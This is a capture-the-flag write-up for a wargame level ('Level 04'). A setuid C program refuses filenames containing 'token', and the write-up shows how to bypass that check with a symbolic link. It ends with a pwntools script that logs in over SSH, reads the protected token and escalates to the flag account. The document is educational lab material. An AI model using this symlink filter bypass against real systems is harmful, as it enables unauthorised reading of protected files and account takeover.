# Level 04

## Discription

>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :) \
\
>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.

## Source Code

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

## Solution

This Challenge was pretty simple. 

Lets understand the code first. Program requires a file name as argument and if not given then it will throw an error and exit.

```c
if(argc == 1) {
    printf("%s [file to read]\n", argv[0]);
    exit(EXIT_FAILURE);
}
```

Here comes the check we have to bypass, it is looking for `token` substring in user argument using [strstr](https://www.tutorialspoint.com/c_standard_library/c_function_strstr.htm) function and strstr function return NULL if substring is not found. So it is checking the return value of strstr and if the return value is not equal to NULL, it throws an error and exit again.

```C
if(strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
}
```

And finally reading and writing the content of the file to stdout.

```C
fd = open(argv[1], O_RDONLY);
if(fd == -1) {
    err(EXIT_FAILURE, "Unable to open %s", argv[1]);
}

rc = read(fd, buf, sizeof(buf));

if(rc == -1) {
    err(EXIT_FAILURE, "Unable to read fd %d", fd);
}

write(1, buf, rc);
}
```

To bypass if condition we have to pass a file name that does not have `token` substring in it. We cannot move or copy the file with different name as we don't have permission for that.

But instead we can create a [symbolic link](https://en.wikipedia.org/wiki/Symbolic_link) of token file with different name and it will bypass the `token` check and as symblink file is pointing to the original token file so `rc = read(fd, buf, sizeof(buf));` will read the original token file and print it out.

![](Images/solution.png)

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level04 = ssh(host=argv[1],user='level04',password='level04')
level04_shell = level04.shell('sh')
level04_shell.sendline('ln -s /home/flag04/token /tmp/link')
level04_shell.sendline('/home/flag04/flag04 /tmp/link > /tmp/pass')
flag04_password = (level04.download_data('/tmp/pass')).decode().strip('\n')
level04_shell.kill()
level04.close()

log.progress(f'Got flag04 password : {flag04_password}')

flag04 = ssh(host=argv[1],user='flag04',password=flag04_password)
flag04_shell = flag04.shell('sh')
flag04_shell.sendline('getflag') 
flag04_shell.interactive() 
```




